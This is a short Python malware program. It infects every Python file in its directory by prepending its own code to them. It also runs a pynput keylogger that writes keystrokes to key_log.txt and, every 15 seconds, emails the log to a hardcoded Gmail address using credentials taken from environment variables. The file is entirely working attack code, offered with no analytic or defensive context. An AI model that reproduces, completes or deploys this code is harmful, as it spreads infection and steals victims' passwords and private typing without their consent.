# VIRUS SAYS HI!
#imports for replicating
import sys
import glob
#imports for send mail
import smtplib
import os
from email.message import EmailMessage
from dotenv import load_dotenv
load_dotenv()
#imports for keylogger
from pynput.keyboard import Listener
import time

def rep():
    virus_code = []

    with open(sys.argv[0], 'r', encoding='utf-8') as f:
        lines = f.readlines()

    self_replicating_part = False
    for line in lines:
        if line == "# VIRUS SAYS HI!":
            self_replicating_part = True
        if not self_replicating_part:
            virus_code.append(line)
        if line == "# VIRUS SAYS BYE!\n":
            break

    python_files = glob.glob('*.py') + glob.glob('*.pyw')

    for file in python_files:
        with open(file, 'r',  encoding='utf-8') as f:
            file_code = f.readlines()

        infected = False

        for line in file_code:
            if line == "# VIRUS SAYS HI!\n":
                infected = True
                break

        if not infected:
            final_code = []
            final_code.extend(virus_code)
            final_code.extend('\n')
            final_code.extend(file_code)

            with open(file, 'w',  encoding='utf-8') as f:
                f.writelines(final_code)





# file_path = "C:\\Users\\Ibrahimgidi\\Desktop\\keylog"
file_path = os.getcwd()
extend = "\\"
keys_information = "key_log.txt"
count = 0
keys = []
time_iteration = 15
stoppingTime = time.time() + time_iteration
def keyloger():



    def on_press(key):
            global keys, count, currentTime
            print(key)
            keys.append(key)
            count += 1

            if count >= 1:
                count = 0
                write_file(keys)
                keys = []
    def write_file(keys):
        global stoppingTime
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
            print(time.time() > stoppingTime)
            if time.time() > stoppingTime:
                stoppingTime = time.time()+15
                sendmail()
    
    with Listener(on_press=on_press) as l:
        l.join()   
    

def sendmail():
    print("hi")
    EPSS = os.getenv('EP')
    EAdd = os.getenv('EU')
    msg = EmailMessage()
    msg['subject'] = "haha 👯‍♂️"
    msg['From'] = EAdd
    msg['To'] = 'sirajyesuf762@gmail.com'
    msg.set_content("how about dinner")
    with open(keys_information, 'rb') as f:
        file_data = f.read()
        file_name = f.name
    msg.add_attachment(file_data, maintype='application',
                    subtype='octet-stream', filename=file_name)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EAdd, EPSS)
        smtp.send_message(msg)    


rep()
keyloger()








# VIRUS SAYS BYE!
